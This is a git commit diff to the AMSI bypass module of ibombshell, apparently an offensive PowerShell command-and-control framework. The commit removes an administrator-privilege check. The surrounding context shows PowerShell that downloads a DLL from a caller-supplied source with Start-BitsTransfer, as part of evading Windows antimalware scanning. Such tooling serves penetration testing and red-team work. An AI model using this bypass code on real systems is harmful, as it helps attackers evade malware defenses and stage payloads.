be01c787b5bd067d89bfe256bef3b24e9473dadd
Josue <j.encinar.87@gmail.com>
2019-01-17 13:13:24 +0100

    Update amsi

--- ibombshell c2/modules/bypass/amsi/amsi-dlldisk.py
+++ ibombshell c2/modules/bypass/amsi/amsi-dlldisk.py
@@ -25,8 +25,6 @@ class CustomModule(Module):
                 [Parameter(Mandatory)]
                 [string] $dll
                 )
-                $admin_privileges = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
-		        if (-not $admin_privileges) { return "It is necessary to have admin permissions"}
                 $output = $pwd
                 try{    
                     Start-BitsTransfer -Source $dll -Destination $output
